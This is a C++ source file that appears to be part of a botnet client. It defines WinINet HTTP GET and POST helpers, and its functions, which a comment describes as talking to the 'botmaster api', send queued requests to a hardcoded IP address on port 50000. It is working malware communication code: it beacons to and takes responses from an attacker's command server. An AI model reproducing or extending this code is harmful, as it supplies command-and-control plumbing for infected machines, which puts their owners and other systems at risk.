#include "curl.h"
#include <wininet.h>
#include <tchar.h>
#include <string>
#include "HttpLib.h"
#include "UtilLib.h"
#include <iostream>

using namespace std;

// returns a dynamically allocated array, DONT FORGET TO CLEAN UP the memeory
char* httpGetRequest(string url, string api, int port, char* args){
	// string variable to store the response from the server
	string response = "";
	// append the query string '?args=value..." to the end of the url
	wstring wapi = s2ws(api) + s2ws(args);

	HINTERNET hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hInternet == NULL){}
	else{

		HINTERNET hConnect = InternetConnectW(hInternet, s2ws(url).c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

		if (hConnect == NULL){}
		else{
			const wchar_t* parrAcceptTypes[] = { L"text/*", NULL };
			HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", wapi.c_str(), NULL, NULL, parrAcceptTypes, INTERNET_FLAG_NO_CACHE_WRITE, 0);

			if (hRequest == NULL){}
			else
			{
				LPCWSTR hdrs = L"Content-Type: application/x-www-form-urlencoded";

				BOOL bRequestSent = HttpSendRequestW(hRequest, hdrs, wcslen(hdrs), NULL, 0);

				if (!bRequestSent){}
				else{
					const int nBuffSize = 1024;
					char buff[nBuffSize];

					BOOL bKeepReading = true;
					DWORD dwBytesRead = -1;

					while (bKeepReading && dwBytesRead != 0){
						bKeepReading = InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
						response.append(buff, dwBytesRead);
					}
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
	// allocate memory for the char*
	char *res = new char[response.length() + 1];
	strcpy_s(res, response.length()+1, response.c_str());
	return res;
}

// returns a dynamically allocated array, DONT FORGET TO CLEAN UP the memeory
char* httpPostRequest(string url, string api, int port, char *args){
	string response = "";

	HINTERNET hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hInternet == NULL){}
	else{
		HINTERNET hConnect = InternetConnectW(hInternet, s2ws(url).c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

		if (hConnect == NULL){}
		else
		{
			const wchar_t* parrAcceptTypes[] = { L"text/*", NULL };
			HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", s2ws(api).c_str(), NULL, NULL, parrAcceptTypes, 0, 0);

			if (hRequest == NULL){}
			else{
				LPCWSTR hdrs = L"Content-Type: application/x-www-form-urlencoded";

				BOOL bRequestSent = HttpSendRequestW(hRequest, hdrs, wcslen(hdrs), args, strlen(args));

				if (!bRequestSent){}
				else{
					const int nBuffSize = 1024;
					char buff[nBuffSize];

					BOOL bKeepReading = true;
					DWORD dwBytesRead = -1;

					while (bKeepReading && dwBytesRead != 0){
						bKeepReading = InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
						response.append(buff, dwBytesRead);
					}
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
	// allocate a char array for the return value
	char* res = new char[response.length() + 1];
	strcpy_s(res, response.length() + 1, response.c_str());
	return res;
}

//sends a post request to the botmaster api
void sendP_Request(vector<vector<string>> &requestQueue, vector<string> keys, vector<string> values, string api){
	char* query = NULL;
	getArgsToString(keys, values, getSize(keys), keys, getSize(keys), "POST", &query);
	if (strcmp(query, "err") != 0){
		char* postRes = httpPostRequest("70.61.16.8", api, 50000, query);
		if (strcmp(postRes, "") == 0){
			string requestParams = "";
			requestParams.append(query);
			queueRequest(requestQueue, api, requestParams);
		}
		delete[] postRes;
	}
}

//sends a get request to the botmaster api
char* sendG_Request(vector<vector<string>> &requestQueue, vector<string> keys, vector<string> values, vector<string> params, string api){
	char* query = NULL;
	getArgsToString(keys, values, getSize(keys), params, getSize(params), "GET", &query);
	if (strcmp(query, "err") != 0){
		char* getRes = httpGetRequest("70.61.16.8", api, 50000, query);
		if (strcmp(getRes, "") == 0){
			string requestParams = "";
			requestParams.append(query);
			queueRequest(requestQueue, api, requestParams);
			char * down = "down";
			delete[] getRes;
			delete[] query;
			return down;
		}
		return getRes;
	}
	else{
		char* err = "err";
		delete[] query;
		return err;
	}
}

//void sendP_Request(vector<vector<string>> &requestQueue, vector<string> keys, vector<string> values, vector<string> params, string api, string data){
//	char* query = NULL;
//	if (data.compare("")){
//		params.push_back("data");
//		keys.push_back("data");
//		values.push_back(data);
//	}
//	getArgsToString(keys, values, getSize(keys), params, getSize(params), "POST", &query);
//	if (strcmp(query, "err") != 0){
//		char* postRes = httpPostRequest("70.61.16.8", api, 50000, query);
//		if (strcmp(postRes, "") == 0){
//			string requestParams = "";
//			requestParams.append(query);
//			queueRequest(requestQueue, api, requestParams);
//		}
//		delete[] postRes;
//	}
//}
